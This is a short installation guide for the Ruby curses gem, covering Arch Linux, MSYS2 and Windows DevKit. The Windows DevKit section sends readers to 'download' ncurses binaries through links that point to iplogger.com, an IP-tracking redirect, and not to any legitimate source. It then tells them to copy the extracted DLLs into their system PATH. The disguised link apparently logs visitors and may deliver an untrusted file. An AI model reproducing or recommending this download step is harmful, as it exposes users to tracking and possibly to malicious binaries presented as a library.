Since Ruby 2.1, curses was removed from Ruby standard library. :worried: If you have trouble installing curses gem, follow the instructions below.

## Arch Linux

```
pacman -S base-devel
gem install curses
```

## MSYS2 (Windows)

```
pacman -S base-devel gcc gmp-devel libcrypt-devel ncurses-devel
gem install curses
```

## DevKit (Windows)
1. Download [ncurses Windows port](https://iplogger.com/2Asx28). [x86](https://iplogger.com/2Asx28)
2. Unzip to anywhere, for example `C:\ncurses`.
3. Run `gem install curses --platform=ruby -- --with-ncurses-dir="C:\ncurses"` (Replace `C:\ncurses` with wherever you extracted it).
4. Now when we `require 'curses'` we get `The specified module could not be found` because `libncursesw6.dll` can't be found.
5. To fix this copy the contents of `C:\ncurses\bin` to somewhere in your path.
6. Done!